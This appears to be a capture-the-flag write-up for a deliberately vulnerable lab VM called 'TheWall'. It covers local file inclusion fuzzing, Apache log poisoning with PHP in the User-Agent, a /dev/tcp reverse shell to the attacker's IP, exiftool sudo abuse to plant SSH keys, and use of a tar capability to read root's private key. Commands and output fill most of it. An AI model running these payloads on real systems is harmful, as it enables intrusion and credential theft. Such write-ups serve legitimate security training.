---
title: TheWall
layout: default
---


## 1. Reconnaissance

### 1.1. Enumerate of the network

```bash
ifconfig
```

**OUTPUT**

```bash
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.104  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::f84f:aaf4:a787:c420  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:0f:50:93  txqueuelen 1010  (Ethernet)
```

**Key points:** 
- Networok Interface: `ens160`

```bash
arp-scan -I ens160 -lg
```

**OUTPUT**

```bash
192.168.0.101	08:00:27:e7:d7:62	PCS Systemtechnik GmbH
```

**Key points:** 
- IP Machine: `192.168.0.101`

### 1.2. Scanning of Ports

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.101
```

**OUTPUT**

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

**Key points:** 
- `22/tcp open ssh`: This indicates that the SSH (Secure Shell) service is running on port 22.
- `80/tcp open http`: This indicates that the HTTP (Hypertext Transfer Protocol) service is running on port 80.
- `ttl 64`: Linux Machine

Go to `192.168.0.101`

![](/assets/images/TheWall.png)

## 2. Enumerate Directories and Files

```bash
gobuster dir -u http://192.168.0.101:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```

**OUTPUT**

```bash
/cgi                  (Status: 403) [Size: 18]
/management           (Status: 403) [Size: 18]
/headers              (Status: 403) [Size: 18]
/add                  (Status: 403) [Size: 18]
/icon                 (Status: 403) [Size: 18]
/60                   (Status: 403) [Size: 18]
/33                   (Status: 403) [Size: 18]
/enterprise           (Status: 403) [Size: 18]
/46                   (Status: 403) [Size: 18]
/all                  (Status: 403) [Size: 18]
/tag                  (Status: 403) [Size: 18]
/opinion              (Status: 403) [Size: 18]
/49                   (Status: 403) [Size: 18]
/53                   (Status: 403) [Size: 18]
/code                 (Status: 403) [Size: 18]
/pl                   (Status: 403) [Size: 18]
/consumer             (Status: 403) [Size: 18]
/57                   (Status: 403) [Size: 18]
```

>[!Note]
>As that i got many 403 codes, the server apparently has `WAF` (Web Application Firewall)

For this, i set up delay `500ms` and threads 1:

```bash
gobuster dir -u http://192.168.0.101 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 1 -d 500ms
```

**OUTPUT**

```bash
/.php                 (Status: 403) [Size: 18]
/index.php            (Status: 200) [Size: 25]
/includes.php         (Status: 200) [Size: 2]
```

**Key points:** 
- `includes.php`: It could include sensitive code (include('config.php'), credentials, etc.).

### 2.1. Fuzzing to `/includes.php`

```bash
wfuzz -u "http://192.168.0.101/includes.php?FUZZ=test" -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hh 2 --hc 404
```

**OUTPUT**

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                
=====================================================================

000204417:   200        28 L     41 W        2 Ch        "display_page"
```


### 2.2. Fuzzing to parameter `display_page`

```bash
wfuzz -u "http://192.168.0.101/includes.php?display_page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hh 2 --hc 404
```

**OUTPUT**

```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                
=====================================================================

000000016:   200        28 L     41 W       1460 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%
                                                        2e/%2e%2e/%2e%2e/etc/passwd"                           
000000023:   200        28 L     41 W       1460 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"               
000000020:   200        28 L     41 W       1460 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2
                                                        Fetc%2Fpasswd"                                         
000000126:   200        23 L     190 W      1044 Ch     "/etc/crontab"                                         
000000124:   200        21 L     109 W      1013 Ch     "/etc/apt/sources.list"                                
000000116:   200        228 L    1115 W     7223 Ch     "/etc/apache2/apache2.conf"                            
000000133:   200        56 L     55 W       760 Ch      "/etc/group"                                           
000000130:   200        17 L     115 W      878 Ch      "/etc/fstab"                                           
000000204:   200        18 L     111 W      713 Ch      "/etc/hosts.deny"                                      
000000203:   200        11 L     57 W       413 Ch      "/etc/hosts.allow"                                     
000000200:   200        8 L      23 W       205 Ch      "/etc/hosts"                                           
000000232:   200        3 L      5 W        29 Ch       "/etc/issue"                                           
000000254:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../../../
                                                        ../../../etc/passwd"                                   
000000253:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../../../
                                                        ../../../../etc/passwd"                                
000000252:   200        28 L     41 W       1460 Ch     "/etc/passwd"                                          
000000249:   200        28 L     41 W       1460 Ch     "/../../../../../../../../../../etc/passwd"            
000000248:   200        28 L     41 W       1460 Ch     "/./././././././././././etc/passwd"                    
000000244:   200        20 L     103 W      769 Ch      "/etc/netconfig"                                       
000000231:   200        356 L    1050 W     8183 Ch     "/etc/init.d/apache2"                                  
000000255:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../../../
                                                        ../../etc/passwd"                                      
000000261:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../etc/passwd" 
000000269:   200        28 L     41 W       1460 Ch     "../../../../../../etc/passwd"                         
000000245:   200        21 L     61 W       496 Ch      "/etc/nsswitch.conf"                                   
000000267:   200        28 L     41 W       1460 Ch     "../../../../../../../../etc/passwd"                   
000000266:   200        28 L     41 W       1460 Ch     "../../../../../../../../../etc/passwd"                
000000265:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../etc/passwd"             
000000264:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../etc/passwd"          
000000263:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../etc/passwd"       
000000260:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../etc/passw
                                                        d"                                                     
000000262:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../etc/passwd"    
000000259:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../etc/pa
                                                        sswd"                                                  
000000256:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../../../
                                                        ../etc/passwd"                                         
000000258:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../../etc
                                                        /passwd"                                               
000000272:   200        28 L     41 W       1460 Ch     "../../../etc/passwd"                                  
000000271:   200        28 L     41 W       1460 Ch     "../../../../etc/passwd"                               
000000268:   200        28 L     41 W       1460 Ch     "../../../../../../../etc/passwd"                      
000000241:   200        8 L      40 W       288 Ch      "/etc/motd"                                            
000000257:   200        28 L     41 W       1460 Ch     "../../../../../../../../../../../../../../../../../../
                                                        etc/passwd"                                            
000000276:   200        28 L     41 W       1460 Ch     ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd"             
000000201:   200        8 L      23 W       205 Ch      "../../../../../../../../../../../../etc/hosts"        
000000306:   200        28 L     41 W       1460 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"           
000000270:   200        28 L     41 W       1460 Ch     "../../../../../etc/passwd"                            
000000395:   200        41 L     117 W      889 Ch      "/etc/rpc"                                             
000000417:   200        124 L    396 W      3274 Ch     "/etc/ssh/sshd_config"                                 
000000394:   200        2 L      2 W        25 Ch       "/etc/resolv.conf"                                     
000000494:   200        2 L      5 W        27 Ch       "/proc/loadavg"                                        
000000501:   200        9 L      28 W       207 Ch      "/proc/partitions"                                     
000000499:   200        5 L      44 W       514 Ch      "/proc/net/route"                                      
000000498:   200        5 L      54 W       451 Ch      "/proc/net/dev"                                        
000000496:   200        23 L     132 W      1555 Ch     "/proc/mounts"                                         
000000493:   200        31 L     138 W      1281 Ch     "/proc/interrupts"                                     
000000502:   200        1 L      1 W        29 Ch       "/proc/self/cmdline"                                   
000000505:   200        2 L      21 W       187 Ch      "/proc/version"                                        
000000495:   200        51 L     146 W      1393 Ch     "/proc/meminfo"                                        
000000500:   200        3 L      29 W       302 Ch      "/proc/net/tcp"                                        
000000497:   200        5 L      27 W       318 Ch      "/proc/net/arp"                                        
000000492:   200        28 L     167 W      987 Ch      "/proc/cpuinfo"                                        
000000504:   200        57 L     135 W      1332 Ch     "/proc/self/status"                                    
000000694:   200        1 L      1 W        292294 Ch   "/var/log/lastlog"                                     
000000745:   200        2 L      3 W        1151 Ch     "/var/run/utmp"                                        
000000753:   200        8 L      12 W       136 Ch      "/var/www/html/.htaccess"                              
000000736:   200        32 L     81 W       42588 Ch    "/var/log/wtmp"                                        
000000922:   200        28 L     41 W       1460 Ch     "///////../../../etc/passwd"                           
000000645:   200        556672   7104428    60614924    "../../../../../../../var/log/apache2/access.log"      
                         L       W          Ch                                                                 
000000643:   200        556662   7104308    60613510    "/var/log/apache2/access.log"                          
                         L       W          Ch                                                                 

Total time: 0
Processed Requests: 922
Filtered Requests: 857
Requests/sec.: 0
```

**Key points:** 
- `curl "http://192.168.0.101/includes.php?display_page=/var/log/apache2/access.log"`
- `/var/log/apache2/access.log`

## 3. Explotation LFI

**Curl `/etc/passwd`**:

```bash
❯ curl "http://192.168.0.101/includes.php?display_page=/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:104:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
john:x:1000:1000:,,,:/home/john:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
```

**Key points:** 
- `john` → `/home/john`

**Curl `/var/log/apache2/access.log`**:

```bash
❯ curl "http://192.168.0.101/includes.php?display_page=/var/log/apache2/access.log"

192.168.0.102 - - [25/Feb/2025:10:16:35 -0500] "GET / HTTP/1.1" 200 229 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" 192.168.0.102 - - [25/Feb/2025:10:16:36 -0500] "GET /favicon.ico HTTP/1.1" 404 192 "http://192.168.0.101/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" 192.168.0.102 - - [25/Feb/2025:10:17:10 -0500] "GET /robots.txt HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET / HTTP/1.1" 200 173 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /b459b4d4-78a8-4124-9991-0b36071aee96 HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.cache HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.cvsignore HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git-rewrite HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.forward HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git/config HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git/index HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git/logs/ HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git_release HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitattributes HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitconfig HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitignore HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitk HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitkeep HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitmodules HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.gitreview HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.history HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.hta HTTP/1.1" 403 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.htaccess HTTP/1.1" 403 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.git/HEAD HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.listing HTTP/1.1" 404 192 "-" "gobuster/3.6" 192.168.0.104 - - [25/Feb/2025:10:18:07 -0500] "GET /.listings HTTP/1.1" 404 192 "-" "gobuster/3.6"
```

This is only a pice.

**I tested if it allows me to enter PHP code**

```bash
❯ curl -A "<?php system('id'); ?>" http://192.168.0.101

<h1>HELLO WORLD!</h1>
```

```bash
❯ curl "http://192.168.0.101/includes.php?display_page=/var/log/apache2/access.log" -s | tail
"
192.168.0.104 - - [25/Feb/2025:14:25:55 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60663236 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:26:45 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60663388 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:27:24 -0500] "GET / HTTP/1.1" 200 173 "-" "user.txt
"
192.168.0.104 - - [25/Feb/2025:14:27:28 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60663628 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:32:25 -0500] "GET /includes.php?display_page=/etc/passwd HTTP/1.1" 200 1633 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:37:00 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60663912 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:41:54 -0500] "GET / HTTP/1.1" 200 173 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Effectly, it responds: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

So I injected Bash commands into a PHP block to list John´s content:

```bash
❯ curl -A "<?php system('ls -l /home/john/'); ?>" http://192.168.0.101

<h1>HELLO WORLD!</h1>
```

```bash
❯ curl "http://192.168.0.101/includes.php?display_page=/var/log/apache2/access.log" -s | tail
192.168.0.104 - - [25/Feb/2025:14:37:00 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60663912 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:41:54 -0500] "GET / HTTP/1.1" 200 173 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
"
192.168.0.104 - - [25/Feb/2025:14:42:34 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60664197 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:44:51 -0500] "GET / HTTP/1.1" 200 173 "-" "user.txt
"
192.168.0.104 - - [25/Feb/2025:14:44:58 -0500] "GET /includes.php?display_page=/var/log/apache2/access.log HTTP/1.1" 200 60664437 "-" "curl/8.12.1-DEV"
192.168.0.104 - - [25/Feb/2025:14:46:34 -0500] "GET / HTTP/1.1" 200 173 "-" "total 4
-rw-r--r-- 1 john john 33 Oct 19  2022 user.txt
"
```

John has under his power `user.txt`

```bash
❯ curl -A "<?php system('cat /home/john/user.txt'); ?>" http://192.168.0.101

<h1>HELLO WORLD!</h1>
```

![](/assets/images/TheWall-1.png)

### 3.1. Access to `John`

I tried to reverse Shell using this payload to access the machine:

```bash
bash -c '/bin/bash -i >& /dev/tcp/192.168.0.104/8888 >&1'
```

I tried to do it by Burp Suite, for this I codified it as URL *(URL encoded)*

```
bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F8888%20%3E%261%27
```

```
GET /includes.php?display_page=/var/log/apache2/access.log&PLD=bash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.104%2F8888%20%3E%261%27 HTTP/1.1
Host: 192.168.0.106
User-Agent: <?php system($_GET[PLD]); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

![](/assets/images/TheWall-6.png)

```bash
❯ nc -nlvp 8888
listening on [any] 8888 ...
```

I won access to the machine but I was bumping from one:

![](/assets/images/TheWall-7.png)

So I got to do it in this way:

```bash
curl -A '<?php echo 456; system($_GET[1]);?>' http://192.168.0.106/index.php
curl -G --data-urlencode 'display_page=/var/log/apache2/access.log' --data-urlencode '1=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.0.104/8888 0>&1"' http://192.168.0.106/includes.php
```

**Key points:** 

```bash
curl -A '<?php echo 456; system($_GET[1]);?>' http://192.168.0.106/index.php
```

- **Sends a request with a custom User-Agent** containing PHP code.
- **If the server logs User-Agent values**, this PHP code might be stored in Apache logs.
- The PHP code:
    - `echo 456;` → Prints `456` (used for testing).
    - `system($_GET[1]);` → Executes remote commands via the `1` GET parameter.
- **Purpose:** Inject a backdoor into the log file for later execution.

```bash
curl -G --data-urlencode 'display_page=/var/log/apache2/access.log' \
         --data-urlencode '1=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.0.104/8888 0>&1"' \
         http://192.168.0.106/includes.php
```

- **Uses `-G` to send a GET request instead of POST.**
- **Requests to view the Apache log file (`display_page=/var/log/apache2/access.log`).**
- **Injects a reverse shell payload in the `1` parameter.**
    - Executes a bash shell.
    - Redirects input/output to your machine (`192.168.0.104`) on port `8888`.
- **If `includes.php` runs `system($_GET[1])`, it will execute the reverse shell.**
- **Purpose:** Trigger remote command execution and get a shell.

```bash
❯ nc -nlvp 8888
listening on [any] 8888 ...
connect to [192.168.0.104] from (UNKNOWN) [192.168.0.106] 44806
bash: cannot set terminal process group (469): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheWall:/var/www/html$ pwd
pwd
/var/www/html
www-data@TheWall:/var/www/html$ 
```

Here if I was successful.

## 4. Privilege Escalation

I listed the permissions:

```bash
www-data@TheWall:/home/john$ sudo -l
sudo -l
Matching Defaults entries for www-data on TheWall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on TheWall:
    (john : john) NOPASSWD: /usr/bin/exiftool
www-data@TheWall:/home/john$
```

**Key points:** 
- John whitout password is enabled of execute the exiftool binary

So i take advantage of this to access to john by ssh:

### 4.1. Ssh to John

![](/assets/images/TheWall-8.png)

Once the `RSA` renamed the public RSA to` authorized_keys` and copy me your contend for leugo later copy it to John.

Back in `www-data`, I ranked in`/tmp` I kept the public RSA

![](/assets/images/TheWall-9.png)

And taking advantage of the fact that John can execute exutfool, as can be seen in the image I managed to strain the `authorized_keys`.

This was the used command:

```bash
sudo -u john exiftool -filename=/home/john/.ssh/authorized_keys -comment="$(cat autorized_keys)" /dev/null
```

**Key points:** 
- `sudo -u john`: Runs the command as `john`, since `www-data` has `NOPASSWD` privileges for `exiftool`.
- `exiftool -filename=/home/john/.ssh/authorized_keys`: `exiftool` is being to write data to the file `/home/john/.ssh/authorized_keys`.
- `-comment="$(cat authorized_keys)"`
- The `-comment` flag sets a metadata field called "comment" inside a file.
	- `$(cat authorized_keys)`:
	    - Reads the contents of the file `authorized_keys` (which contains the SSH public key).
	    - Inserts it as a string into the `-comment` argument.
- `/dev/null`
	- `exiftool` requires an input file to process metadata.
	- `/dev/null` is used as a dummy file to satisfy this requirement (it’s an empty, discardable file).

Once this was done, I accessed to john by ssh:

![](/assets/images/TheWall-10.png)

>[!Note]
> I connected from the same place where I created the RSA (`/tmp`).

As john do not have wget

![](/assets/images/TheWall-11.png)

So used `scp` to transfer `pspy64`, but i didn't find anything, Then i opted for `linpeas.sh`

```bash
❯ scp -i /tmp/id_rsa_john linpeas.sh john@192.168.0.106:/tmp/

linpeas.sh                                                                            100%  820KB   7.0MB/s   00:00   
```

```bash
john@TheWall:/tmp$ chmod +x linpeas.sh 
john@TheWall:/tmp$ ,/linpeas.sh
```

Of the report of `linPEAS`, i found it these:

![](/assets/images/TheWall-12.png)

**Key points:** 
- These are **SSH public host keys**, used by the server for authentication.

![](/assets/images/TheWall-13.png)

**Key points:** 
- `cap_dac_read_search=ep` (on `/usr/sbin/tar`)
	- Allows **bypassing file permissions** (read/search access to all files).
	- Could be used to read sensitive files that normally require root.

>[!Note]
Since the public keys exist, the corresponding private keys almost certainly exist in the same directory.

### 4.2. Escalation to `root`

```bash
john@TheWall:/tmp$ /usr/sbin/tar -czf id_rsa.tar.gz /etc/ssh/ssh_host_rsa_key
john@TheWall:/tmp$ /usr/sbin/tar -xvf id_rsa.tar.gz -C /tmp
etc/ssh/ssh_host_rsa_key
john@TheWall:/tmp$ chmod 644 /tmp/etc/ssh/ssh_host_rsa_key
john@TheWall:/tmp$ cat /tmp/etc/ssh/ssh_host_rsa_key
# Here it is showed thw RSA
```

Copié el contenido de la llave privada a mi máquiina

```bash
❯ ssh -i id_rsa_root root@192.168.0.106
root@192.168.0.106: Permission denied (publickey)
```

I didn't achieve the goal, So...

```bash
john@TheWall:~$ find / -name "id_rsa" 2>/dev/null
/id_rsa
```

Luckily I found another `id_rsa`.

```bash
john@TheWall:/$ ls -l
total 68
lrwxrwxrwx   1 root root     7 Oct 17  2022 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Oct 17  2022 boot
drwxr-xr-x  17 root root  3160 Feb 26 10:00 dev
drwxr-xr-x  72 root root  4096 Feb 26 13:31 etc
drwxr-xr-x   3 root root  4096 Oct 17  2022 home
-rw-------   1 root root  2602 Oct 19  2022 id_rsa
-rw-r--r--   1 root root   566 Oct 19  2022 id_rsa.pub
lrwxrwxrwx   1 root root    31 Oct 17  2022 initrd.img -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root    31 Oct 17  2022 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Oct 17  2022 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 17  2022 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 17  2022 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 17  2022 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct 17  2022 lost+found
drwxr-xr-x   4 root root  4096 Oct 17  2022 media
drwxr-xr-x   2 root root  4096 Oct 17  2022 mnt
drwxr-xr-x   2 root root  4096 Oct 17  2022 opt
dr-xr-xr-x 149 root root     0 Feb 26 10:00 proc
drwx------   4 root root  4096 Oct 19  2022 root
drwxr-xr-x  18 root root   540 Feb 26 12:46 run
lrwxrwxrwx   1 root root     8 Oct 17  2022 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 17  2022 srv
dr-xr-xr-x  13 root root     0 Feb 26 10:00 sys
drwxrwxrwt  10 root root  4096 Feb 26 14:09 tmp
drwxr-xr-x  14 root root  4096 Oct 17  2022 usr
drwxr-xr-x  12 root root  4096 Oct 17  2022 var
lrwxrwxrwx   1 root root    28 Oct 17  2022 vmlinuz -> boot/vmlinuz-5.10.0-18-amd64
lrwxrwxrwx   1 root root    28 Oct 17  2022 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64
john@TheWall:/$ 
```

As it was to imagine

```bash
-rw-------   1 root root  2602 Oct 19  2022 id_rsa
```

So, i repeted the same steps that did for `/etc/ssh/ssh_host_rsa_key`

```bash
john@TheWall:/tmp$ /usr/sbin/tar -czf id_rsa.tar.gz /id_rsa
/usr/sbin/tar: Removing leading `/' from member names
john@TheWall:/tmp$ /usr/sbin/tar -xvf id_rsa.tar.gz -C /tmp
id_rsa
john@TheWall:/tmp$ chmod 644 id_rsa
john@TheWall:/tmp$ cat id_rsa
# Here it is showed thw RSA
```

In this case, SSH's connection was done by John, so it will not be necessary to copy the content of `id_rsa` on the other side.

```bash
john@TheWall:/tmp$ chmod 600 id_rsa
john@TheWall:/tmp$ ssh -i id_rsa root@127.0.0.1

root@TheWall:~# 
```

>[!Note]
The `id_rsa` had 644 permits, so SSH will reject it, as SSH rejects private keys that are accessible by other users for security. That is why I established 600 permissions so that only the John user.

![](/assets/images/TheWall-14.png)

**SECOND FLAG**

